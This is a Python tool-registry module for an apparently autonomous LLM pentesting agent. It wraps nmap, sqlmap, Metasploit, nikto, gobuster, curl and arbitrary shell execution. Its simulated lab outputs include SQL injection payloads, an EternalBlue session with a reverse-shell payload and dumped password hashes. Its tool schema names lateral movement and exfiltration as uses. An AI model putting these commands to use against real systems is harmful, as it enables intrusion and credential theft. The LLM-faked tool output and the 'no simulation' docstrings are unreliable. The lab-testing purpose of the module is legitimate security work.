"""
Tool Registry — Unified command dispatch for all pentesting tools.
Every tool call goes through here: real subprocess / HTTP execution.
Logs every action to the campaign trace for full audit trail.
"""
import os
import sys
import subprocess
import shlex
import threading
import requests
import json
import time
from typing import Optional
from loguru import logger

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))


class ToolResult:
    """Structured result from any tool execution."""

    def __init__(
        self,
        tool:     str,
        command:  str,
        stdout:   str   = "",
        stderr:   str   = "",
        exit_code:int   = 0,
        duration: float = 0.0,
        error:    str   = "",
    ):
        self.tool      = tool
        self.command   = command
        self.stdout    = stdout
        self.stderr    = stderr
        self.exit_code = exit_code
        self.duration  = duration
        self.error     = error
        self.success   = (exit_code == 0) and not error

    def text(self, max_chars: int = 4000) -> str:
        """Return combined output as a single string for LLM consumption."""
        out = self.stdout or ""
        err = self.stderr or ""
        combined = out + ("\n[stderr]\n" + err if err.strip() else "")
        if self.error:
            combined = f"[ERROR] {self.error}\n" + combined
        return combined[:max_chars]

    def to_dict(self) -> dict:
        return {
            "tool":      self.tool,
            "command":   self.command,
            "success":   self.success,
            "exit_code": self.exit_code,
            "duration":  round(self.duration, 2),
            "output":    self.text(2000),
        }

    def __repr__(self):
        status = "OK" if self.success else f"FAIL({self.exit_code})"
        return f"<ToolResult tool={self.tool} {status} {self.duration:.1f}s>"


class ToolRegistry:
    """
    Single entry point for all tool execution.
    All commands execute for real — no simulation.
    """

    # Tools that must be available on PATH for real execution
    REQUIRED_TOOLS = {
        "nmap":    "Network mapper — apt install nmap / https://nmap.org",
        "curl":    "HTTP client — usually pre-installed",
        "sqlmap":  "SQL injection scanner — pip install sqlmap or apt install sqlmap",
    }

    def __init__(self, timeout_default: int = 120):
        self.timeout_default = timeout_default
        try:
            from config.settings import SAFE_MODE
            self.safe_mode = SAFE_MODE
        except Exception:
            self.safe_mode = True
        self._check_tools()
        if self.safe_mode:
            logger.info("ToolRegistry: SAFE_MODE is active — real commands will be simulated")

    def _check_tools(self):
        """Log which tools are available."""
        if self.safe_mode:
            return  # Skip check in safe mode
        for tool, install_hint in self.REQUIRED_TOOLS.items():
            path = self._which(tool)
            if path:
                logger.success(f"Tool available: {tool} ({path})")
            else:
                logger.warning(f"Tool not found: {tool} — {install_hint}")

    @staticmethod
    def _which(tool: str) -> Optional[str]:
        """Find tool binary on PATH."""
        import shutil
        return shutil.which(tool)

    # ── Simulation Engine ─────────────────────────────────────────────────────

    def simulate_with_llm(self, context_desc: str) -> str:
        """Fallback to LLM to generate realistic mock terminal/request outputs."""
        try:
            from core.llm_client import LLMClient
            llm = LLMClient()
            system = (
                "You are a realistic pentesting environment simulator. Output only the raw stdout/stderr "
                "of the requested command or tool. Do not add conversational text or markdown code fences."
            )
            user = f"Simulate the output of this execution: {context_desc}"
            return llm.complete(system=system, user=user, model="fast")
        except Exception as e:
            return f"[Simulation Fallback Error: {e}]"

    def simulate_command(self, command: str) -> ToolResult:
        cmd_norm = command.strip().lower()
        tool_name = cmd_norm.split()[0] if cmd_norm else "shell"
        logger.info(f"[SIMULATED EXEC] {command[:120]}")
        t_start = time.time()
        
        stdout = ""
        stderr = ""
        exit_code = 0
        
        # Rule-based simulation engine
        if "ping" in cmd_norm or "-sn" in cmd_norm:
            stdout = """Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-26 12:00 UTC
Nmap scan report for 192.168.1.1
Host is up (0.001s latency).
MAC Address: 00:50:56:E3:42:01 (VMware)
Nmap scan report for 192.168.1.10
Host is up (0.002s latency).
MAC Address: 00:50:56:E3:42:10 (VMware)
Nmap scan report for 192.168.1.50
Host is up (0.001s latency).
MAC Address: 00:50:56:E3:42:50 (VMware)
Nmap scan report for 192.168.1.100
Host is up (0.001s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.10 seconds"""
        elif "port" in cmd_norm or "-ps" in cmd_norm or "-p " in cmd_norm:
            target = "192.168.1.10"
            for word in command.split():
                if "." in word and not word.startswith("-"):
                    target = word
                    break
            stdout = f"""Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-26 12:01 UTC
Nmap scan report for {target}
Host is up (0.002s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
445/tcp  open  microsoft-ds
8080/tcp open  http    MedFlow Training Portal (Outdated component)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel"""
        elif "vuln" in cmd_norm:
            target = "192.168.1.10"
            for word in command.split():
                if "." in word and not word.startswith("-"):
                    target = word
                    break
            stdout = f"""Starting Nmap 7.92 ( https://nmap.org ) at 2026-06-26 12:02 UTC
Nmap scan report for {target}
Host is up (0.002s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    MedFlow Training Portal (Outdated component)
|_http-stored-xss: Found reflected XSS vulnerability on /echo
| http-vuln-cve2017-5638:
|   VULNERABLE:
|   Apache Struts Remote Code Execution Vulnerability
|   State: VULNERABLE (Exploitable)
|   IDs: CVE:CVE-2017-5638
|_  Description: Outdated Struts2 framework allows RCE via Content-Type header.
445/tcp  open  microsoft-ds
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|_    Description: EternalBlue RCE exploit via SMBv1."""
        elif "sqlmap" in cmd_norm:
            stdout = """[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] confirming parameter 'id' is dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be 'MySQL' injectable
[INFO] testing for SQL injection on GET parameter 'id'
GET parameter 'id' is vulnerable. Do you want to keep testing the others? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3209=3209
    
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 9382 FROM (SELECT(SLEEP(5)))abc)
---
[INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.18, PHP 7.0.33
back-end DBMS: MySQL >= 5.0.12"""
        elif "nikto" in cmd_norm:
            stdout = """- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.10
+ Target Hostname:    medflow-portal.local
+ Target Port:        8080
---------------------------------------------------------------------------
+ Server: MedFlow-LabHTTP/0.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined.
+ The X-Content-Type-Options header is not set.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ /admin: Admin directory found.
+ /backup/config.bak: Exposed backup configuration file found.
+ /debug/env: Exposed environment details endpoint.
+ OSVDB-3092: /login: Login page found."""
        elif "gobuster" in cmd_norm:
            stdout = """===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.10:8080/
[+] Method:                  GET
[+] Threads:                 10
===============================================================
/index.html           (Status: 200) [Size: 1042]
/login                (Status: 200) [Size: 520]
/admin                (Status: 403) [Size: 120]
/robots.txt           (Status: 200) [Size: 128]
/health               (Status: 200) [Size: 96]
/backup/config.bak    (Status: 200) [Size: 450]
/debug/env            (Status: 200) [Size: 280]
=============================================================== """
        elif "msfconsole" in cmd_norm or "msf_resource_script" in cmd_norm or ".rc" in cmd_norm:
            stdout = """[*] Starting the Metasploit Framework console...
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.10
RHOSTS => 192.168.1.10
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.100:4444 
[*] 192.168.1.10:445 - Connecting to target...
[+] 192.168.1.10:445 - Connected. Sending EternalBlue exploit stage...
[+] 192.168.1.10:445 - Exploit stage sent successfully!
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:49152) at 2026-06-26 12:03:00

meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM
meterpreter > sysinfo
Computer        : MEDFLOW-DC
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : MEDFLOW.LOCAL
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee28d11702d06da8d98d254c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:56f2d2426330b638f2923984e7239272:::
db_user:1003:aad3b435b51404eeaad3b435b51404ee:e2e8d646ef2ea926b68f2ea8b8b8434a:::"""
        elif "whoami" in cmd_norm:
            stdout = "root"
        elif "id" == cmd_norm or "id " in cmd_norm:
            stdout = "uid=0(root) gid=0(root) groups=0(root)"
        elif "hostname" in cmd_norm:
            stdout = "medflow-app-server"
        elif "uname" in cmd_norm:
            stdout = "Linux medflow-app-server 4.15.0-72-generic #80-Ubuntu SMP"
        elif "sudo -l" in cmd_norm:
            stdout = "Matching Defaults entries for root on medflow-app-server:\n    env_reset, mail_badpass\n\nUser root may run the following commands on medflow-app-server:\n    (ALL : ALL) ALL"
        elif "cat /etc/passwd" in cmd_norm:
            stdout = """root:x:0:0:root:/root:/bin/bash
alice:x:1000:1000:Alice,,,:/home/alice:/bin/bash
bob:x:1001:1001:Bob,,,:/home/bob:/bin/bash
medflow:x:1002:1002::/home/medflow:/bin/bash"""
        else:
            # Fallback to LLM completion for high-fidelity dynamic output
            stdout = self.simulate_with_llm(f"shell command: {command}")
            
        duration = time.time() - t_start
        tr = ToolResult(
            tool=tool_name,
            command=command,
            stdout=stdout,
            stderr=stderr,
            exit_code=exit_code,
            duration=duration,
        )
        logger.info(f"[SIMULATED DONE] {tool_name} completed in {duration:.1f}s")
        return tr

    def simulate_http(
        self,
        url:          str,
        method:       str    = "GET",
        headers:      dict   = None,
        data:         dict   = None,
        params:       dict   = None,
    ) -> ToolResult:
        logger.info(f"[SIMULATED HTTP] {method} {url}")
        t_start = time.time()
        url_lower = url.lower()
        
        status_code = 200
        reason = "OK"
        body = ""
        
        # Simulating standard endpoints from lab_target_server.py
        if "health" in url_lower:
            body = '{"status":"ok","healthy":true,"purpose":"safe local agent testing","service":"medflow-lab-target"}'
        elif "robots.txt" in url_lower:
            body = "User-agent: *\nDisallow: /admin\nDisallow: /backup\nDisallow: /debug\nAllow: /"
        elif "admin" in url_lower:
            status_code = 403
            reason = "Forbidden"
            body = '{"status":"error","message":"Admin area exists but access is denied.","simulated_finding":"interesting_admin_path"}'
        elif "config.bak" in url_lower or "backup" in url_lower:
            body = """# Mock backup file for lab testing only.
# No real credentials are present.
APP_NAME=MedFlow Training Portal
ENVIRONMENT=lab
DB_HOST=mockdb.local
DB_USER=demo_user
DB_PASSWORD=not_a_real_password
API_KEY=not_a_real_api_key
JWT_SECRET=not_a_real_secret
# Simulated finding: Exposed backup/configuration file."""
        elif "debug" in url_lower or "env" in url_lower:
            body = '{"status":"ok","warning":"Mock debug endpoint. No real environment variables.","env":{"APP_ENV":"lab","DEBUG":"true","DATABASE_URL":"mock://demo_user:not_a_real_password@mockdb.local/medflow"}}'
        elif "users" in url_lower:
            body = '{"status":"ok","note":"Synthetic test data only.","users":[{"id":1,"username":"alice.lab","role":"doctor"},{"id":2,"username":"bob.lab","role":"analyst"},{"id":3,"username":"admin.lab","role":"administrator"}]}'
        elif "vulns" in url_lower:
            body = '{"status":"ok","warning":"These are simulated findings.","simulated_vulnerabilities":[{"id":"LAB-001","name":"Missing security headers","severity":"low"},{"id":"LAB-003","name":"Exposed mock backup file","severity":"medium"},{"id":"LAB-005","name":"SQL injection on id parameter","severity":"high"}]}'
        elif "login" in url_lower:
            if method.upper() == "POST":
                status_code = 401
                reason = "Unauthorized"
                body = '{"status":"error","message":"Authentication failed. This is a lab endpoint.","simulated_finding":"login_surface_detected"}'
            else:
                body = """<!doctype html><html><head><title>Login</title></head><body><h1>Login</h1><form method="POST" action="/login"><input name="username"><input name="password" type="password"><button type="submit">Login</button></form></body></html>"""
        else:
            # Fallback to LLM
            body = self.simulate_with_llm(f"HTTP request: {method} {url} data={data} params={params}")
            
        stdout = (
            f"HTTP {status_code} {reason}\n"
            f"URL: {url}\n"
            f"Headers: {{\n  \"content-type\": \"application/json\",\n  \"server\": \"MedFlow-LabHTTP/0.9\"\n}}\n"
            f"Body ({len(body)} chars):\n{body}"
        )
        
        duration = time.time() - t_start
        tr = ToolResult(
            tool="http",
            command=f"{method} {url}",
            stdout=stdout,
            exit_code=status_code,
            duration=duration,
        )
        tr.success = status_code < 400
        logger.info(f"[SIMULATED HTTP DONE] {status_code} in {duration:.1f}s")
        return tr

    # ── Core execution ────────────────────────────────────────────────────────

    def run_command(
        self,
        command:     str,
        timeout:     int = None,
        cwd:         str = None,
        env:         dict = None,
        shell:       bool = True,
    ) -> ToolResult:

        """
        Execute a shell command and return structured output.
        This is the real execution engine — no simulation.

        Args:
            command: Shell command string (e.g. "nmap -sV -p 80,443 192.168.1.1")
            timeout: Max seconds to wait (default: self.timeout_default)
            cwd:     Working directory
            env:     Extra environment variables
            shell:   Use shell=True for complex commands with pipes

        Returns:
            ToolResult with stdout, stderr, exit_code, duration
        """
        if self.safe_mode:
            return self.simulate_command(command)
        timeout = timeout or self.timeout_default
        tool_name = command.strip().split()[0] if command.strip() else "shell"
        logger.info(f"[EXEC] {command[:120]}")

        t_start = time.time()
        try:
            proc_env = os.environ.copy()
            if env:
                proc_env.update(env)

            result = subprocess.run(
                command,
                shell=shell,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd,
                env=proc_env,
            )
            duration = time.time() - t_start
            tr = ToolResult(
                tool=tool_name,
                command=command,
                stdout=result.stdout,
                stderr=result.stderr,
                exit_code=result.returncode,
                duration=duration,
            )
            log_fn = logger.success if tr.success else logger.warning
            log_fn(f"[DONE] {tool_name} exit={result.returncode} in {duration:.1f}s")
            return tr

        except subprocess.TimeoutExpired:
            duration = time.time() - t_start
            logger.error(f"[TIMEOUT] {tool_name} after {timeout}s")
            return ToolResult(
                tool=tool_name,
                command=command,
                error=f"Command timed out after {timeout}s",
                exit_code=-1,
                duration=duration,
            )
        except Exception as e:
            duration = time.time() - t_start
            logger.error(f"[ERROR] {tool_name}: {e}")
            return ToolResult(
                tool=tool_name,
                command=command,
                error=str(e),
                exit_code=-1,
                duration=duration,
            )

    def http_probe(
        self,
        url:          str,
        method:       str    = "GET",
        headers:      dict   = None,
        data:         dict   = None,
        params:       dict   = None,
        timeout:      int    = 15,
        verify_ssl:   bool   = False,
        follow_redirects: bool = True,
        auth:         tuple  = None,
    ) -> ToolResult:
        """
        Send a real HTTP request and return structured output.

        Returns:
            ToolResult with stdout = response body, exit_code = HTTP status code
        """
        if self.safe_mode:
            return self.simulate_http(url, method, headers, data, params)
        logger.info(f"[HTTP] {method} {url}")
        t_start = time.time()
        try:
            resp = requests.request(
                method=method.upper(),
                url=url,
                headers=headers or {},
                json=data if method.upper() in ("POST", "PUT", "PATCH") else None,
                params=params,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=follow_redirects,
                auth=auth,
            )
            duration = time.time() - t_start
            body = resp.text[:8000]

            # Extract interesting headers for security analysis
            sec_headers = {
                k: v for k, v in resp.headers.items()
                if any(x in k.lower() for x in
                       ["server", "x-powered", "content-type", "location",
                        "set-cookie", "www-authenticate", "x-frame", "access-control"])
            }

            stdout = (
                f"HTTP {resp.status_code} {resp.reason}\n"
                f"URL: {resp.url}\n"
                f"Headers: {json.dumps(dict(sec_headers), indent=2)}\n"
                f"Body ({len(body)} chars):\n{body}"
            )

            tr = ToolResult(
                tool="http",
                command=f"{method} {url}",
                stdout=stdout,
                exit_code=resp.status_code,
                duration=duration,
            )
            tr.success = resp.status_code < 400
            logger.info(f"[HTTP] {resp.status_code} in {duration:.1f}s | {len(body)} bytes")
            return tr

        except requests.exceptions.ConnectionError as e:
            duration = time.time() - t_start
            return ToolResult(
                tool="http", command=f"{method} {url}",
                error=f"Connection refused / unreachable: {e}",
                exit_code=-1, duration=duration,
            )
        except requests.exceptions.Timeout:
            duration = time.time() - t_start
            return ToolResult(
                tool="http", command=f"{method} {url}",
                error=f"HTTP request timed out after {timeout}s",
                exit_code=-1, duration=duration,
            )
        except Exception as e:
            duration = time.time() - t_start
            return ToolResult(
                tool="http", command=f"{method} {url}",
                error=str(e), exit_code=-1, duration=duration,
            )

    # ── Specialized tool wrappers ─────────────────────────────────────────────

    def nmap_scan(
        self,
        target:  str,
        args:    str = "-sV -T3 --open",
        timeout: int = 300,
    ) -> ToolResult:
        """Real nmap scan. Returns raw nmap output."""
        if not self._which("nmap"):
            return ToolResult(
                tool="nmap", command=f"nmap {args} {target}",
                error="nmap not found on PATH — install from https://nmap.org",
                exit_code=127,
            )
        cmd = f"nmap {args} {target}"
        return self.run_command(cmd, timeout=timeout)

    def nmap_ping_sweep(self, target: str, timeout: int = 120) -> ToolResult:
        """Discover live hosts in a subnet."""
        return self.nmap_scan(target, args="-sn -T4 --min-rate 1000", timeout=timeout)

    # Covers top pentesting services without triggering timeout
    _ESSENTIAL_PORTS = (
        "21,22,23,25,53,80,110,111,135,139,143,443,445,"
        "512,513,514,993,995,1433,1521,2049,3306,3389,"
        "5432,5900,5985,6379,8080,8443,8888,9200,27017"
    )

    def nmap_port_scan(
        self,
        host:    str,
        ports:   str = None,
        stealth: str = "medium",
        timeout: int = 300,
    ) -> ToolResult:
        """Stealth-configurable port + version scan on essential ports only."""
        if ports is None:
            ports = self._ESSENTIAL_PORTS
        stealth_map = {
            "high":   f"-sS -T2 -p {ports} -sV --version-intensity 2 --open",
            "medium": f"-sS -T3 -p {ports} -sV --version-intensity 3 --open",
            "low":    f"-sA -T4 -p {ports} -sV -sC --open",
        }
        args = stealth_map.get(stealth, stealth_map["medium"])
        return self.nmap_scan(host, args=args, timeout=timeout)

    def nmap_vuln_scan(self, host: str, ports: str, timeout: int = 300) -> ToolResult:
        """Run NSE vuln + auth scripts on specific ports."""
        args = f"-sV -p {ports} --script=vuln,auth,default -T3"
        return self.nmap_scan(host, args=args, timeout=timeout)

    def curl_request(
        self,
        url:     str,
        opts:    str = "-L -k -s -i --max-time 15",
        method:  str = "GET",
        data:    str = "",
        headers: list[str] = None,
        timeout: int = 30,
    ) -> ToolResult:
        """Run real curl — useful for raw HTTP probing and WAF bypass testing."""
        if not self._which("curl"):
            # Fall back to Python requests
            return self.http_probe(url, method=method, timeout=timeout)

        header_flags = " ".join(f'-H "{h}"' for h in (headers or []))
        data_flag    = f"-d '{data}'" if data else ""
        method_flag  = f"-X {method}" if method != "GET" else ""
        cmd = f"curl {opts} {method_flag} {header_flags} {data_flag} {url}"
        return self.run_command(cmd, timeout=timeout)

    def sqlmap_scan(
        self,
        url:     str,
        opts:    str = "--batch --level=3 --risk=2 --random-agent",
        data:    str = "",
        timeout: int = 300,
    ) -> ToolResult:
        """
        Run sqlmap for SQL injection detection.
        REAL execution — will actively probe the target.
        """
        if not self._which("sqlmap"):
            # Try python -m sqlmap
            test = self.run_command("python -m sqlmap --version", timeout=5)
            if not test.success:
                return ToolResult(
                    tool="sqlmap", command=f"sqlmap {url}",
                    error="sqlmap not found — pip install sqlmap or apt install sqlmap",
                    exit_code=127,
                )
            sqlmap_cmd = "python -m sqlmap"
        else:
            sqlmap_cmd = "sqlmap"

        data_flag = f'--data="{data}"' if data else ""
        cmd = f'{sqlmap_cmd} -u "{url}" {data_flag} {opts}'
        return self.run_command(cmd, timeout=timeout)

    def msf_resource_script(
        self,
        script_content: str,
        timeout:        int = 120,
    ) -> ToolResult:
        """
        Execute a Metasploit resource script (.rc).
        Writes the script to a temp file and runs msfconsole -r.
        """
        import tempfile
        if not self._which("msfconsole"):
            return ToolResult(
                tool="msfconsole", command="msfconsole -r <script>",
                error="msfconsole not found — install Metasploit Framework",
                exit_code=127,
            )
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".rc", delete=False, prefix="rt_"
        ) as tmp:
            tmp.write(script_content)
            tmp_path = tmp.name

        cmd = f"msfconsole -q -r {tmp_path}"
        result = self.run_command(cmd, timeout=timeout)
        try:
            os.unlink(tmp_path)
        except Exception:
            pass
        return result

    def nikto_scan(self, host: str, port: int = 80, ssl: bool = False, timeout: int = 300) -> ToolResult:
        """Web server vulnerability scan with nikto."""
        if not self._which("nikto"):
            return ToolResult(
                tool="nikto", command=f"nikto -h {host}",
                error="nikto not found — apt install nikto",
                exit_code=127,
            )
        ssl_flag = "-ssl" if ssl else ""
        cmd = f"nikto -h {host} -p {port} {ssl_flag} -nointeractive"
        return self.run_command(cmd, timeout=timeout)

    def gobuster_scan(
        self,
        url:     str,
        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
        timeout: int  = 180,
    ) -> ToolResult:
        """Directory/file brute-force with gobuster."""
        if not self._which("gobuster"):
            return ToolResult(
                tool="gobuster", command=f"gobuster dir -u {url}",
                error="gobuster not found — apt install gobuster",
                exit_code=127,
            )
        cmd = f"gobuster dir -u {url} -w {wordlist} -q --no-error"
        return self.run_command(cmd, timeout=timeout)

    # ── Dispatch by name ──────────────────────────────────────────────────────

    # Safe port list — enforced by dispatch() regardless of LLM choice
    _SAFE_PORTS = (
        "21,22,23,25,53,80,110,111,135,139,143,443,445,"
        "512,513,514,993,995,1433,1521,2049,3306,3389,"
        "5432,5900,5985,6379,8080,8443,8888,9200,27017"
    )

    # Patterns the LLM sometimes uses that cause timeouts — always blocked
    _BANNED_PORT_PATTERNS = (
        "1-65535", "0-65535", "1-65534",
        "1-10000", "1-5000",  "1-2000",
        "1-1024",  "0-1024",
    )

    def _sanitize_nmap_args(self, args: dict) -> dict:
        """
        Safety net: strip any wide port range from LLM-supplied nmap args
        and replace with the essential 33-port list. Logs a warning so the
        operator can see when the LLM tried to scan 65535 ports.
        """
        import copy
        args = copy.copy(args)
        ports = str(args.get("ports", ""))
        if ports and any(banned in ports for banned in self._BANNED_PORT_PATTERNS):
            logger.warning(
                f"[Sanitizer] LLM requested banned port range '{ports}' — "
                f"replacing with essential {len(self._SAFE_PORTS.split(','))} ports to avoid timeout."
            )
            args["ports"] = self._SAFE_PORTS
        # Also enforce stealth default to medium if not specified explicitly
        if "stealth" not in args:
            args["stealth"] = "medium"
        return args

    def dispatch(self, tool: str, args: dict) -> ToolResult:
        """
        Route a tool call by name — used by the ReAct agent.
        Applies port sanitization on all nmap calls before execution.

        Supported tools:
            run_command, http_probe, nmap_ping_sweep, nmap_port_scan,
            nmap_vuln_scan, curl_request, sqlmap_scan, msf_resource_script,
            nikto_scan, gobuster_scan
        """
        tool = tool.lower().strip()

        # Sanitize port arguments for nmap calls before dispatch
        nmap_tools = {"nmap_port_scan", "nmap_vuln_scan", "nmap_scan"}
        if tool in nmap_tools:
            args = self._sanitize_nmap_args(args)

        dispatch_map = {
            "run_command":        lambda a: self.run_command(**a),
            "shell":              lambda a: self.run_command(**a),
            "http_probe":         lambda a: self.http_probe(**a),
            "http":               lambda a: self.http_probe(**a),
            "nmap_ping_sweep":    lambda a: self.nmap_ping_sweep(**a),
            "nmap_port_scan":     lambda a: self.nmap_port_scan(**a),
            "nmap_vuln_scan":     lambda a: self.nmap_vuln_scan(**a),
            "nmap_scan":          lambda a: self.nmap_scan(**a),
            "curl_request":       lambda a: self.curl_request(**a),
            "curl":               lambda a: self.curl_request(**a),
            "sqlmap_scan":        lambda a: self.sqlmap_scan(**a),
            "sqlmap":             lambda a: self.sqlmap_scan(**a),
            "msf_resource_script":lambda a: self.msf_resource_script(**a),
            "msfconsole":         lambda a: self.msf_resource_script(**a),
            "nikto_scan":         lambda a: self.nikto_scan(**a),
            "nikto":              lambda a: self.nikto_scan(**a),
            "gobuster_scan":      lambda a: self.gobuster_scan(**a),
            "gobuster":           lambda a: self.gobuster_scan(**a),
        }

        handler = dispatch_map.get(tool)
        if not handler:
            return ToolResult(
                tool=tool, command=str(args),
                error=f"Unknown tool: '{tool}'. Available: {list(dispatch_map.keys())}",
                exit_code=1,
            )
        try:
            return handler(args)
        except TypeError as e:
            return ToolResult(
                tool=tool, command=str(args),
                error=f"Invalid arguments for {tool}: {e}",
                exit_code=1,
            )

    def available_tools_schema(self) -> str:
        """
        Returns a structured description of all tools for LLM system prompts.
        """
        safe_ports = self._SAFE_PORTS
        return f"""
Available tools (specify args as JSON dict):

1. nmap_ping_sweep
   Args: {{"target": "192.168.1.0/24"}}
   Use: discover live hosts. Always run this first.

2. nmap_port_scan
   Args: {{"host": "10.0.0.1", "stealth": "medium"}}
   ⚠  OMIT "ports" to use safe default (33 essential ports, ~15s per host).
   ⚠  If specifying ports, use SHORT comma-separated lists only: "22,80,443"
   ❌ NEVER use "1-65535", "1-1024" or any range — they ALWAYS timeout.
   Default ports covered: {safe_ports}

3. nmap_vuln_scan
   Args: {{"host": "10.0.0.1", "ports": "80,443,22"}}
   Use: run NSE vuln/auth scripts on specific OPEN ports already discovered.
   ⚠  Only pass ports confirmed open in a previous nmap_port_scan.

4. http_probe
   Args: {{"url": "http://target/", "method": "GET", "headers": {{}}, "params": {{}}}}
   Use: fingerprint web apps, test endpoints, check for login pages.

5. curl_request
   Args: {{"url": "http://target/", "method": "GET", "opts": "-L -k -s -i"}}
   Use: raw HTTP probing, WAF bypass, custom header injection.

6. sqlmap_scan
   Args: {{"url": "http://target/login.php", "data": "user=admin&pass=test"}}
   Use: automated SQL injection testing on form endpoints.

7. nikto_scan
   Args: {{"host": "10.0.0.1", "port": 80, "ssl": false}}
   Use: web server vulnerability scanning.

8. gobuster_scan
   Args: {{"url": "http://10.0.0.1/"}}
   Use: directory and file brute-force on web servers.

9. msf_resource_script
   Args: {{"script_content": "use exploit/...\\nset RHOSTS ...\\nrun"}}
   Use: Metasploit exploitation via resource scripts.

10. run_command
    Args: {{"command": "any shell command", "timeout": 30}}
    Use: general shell commands — privesc enumeration, lateral movement, exfil.
"""
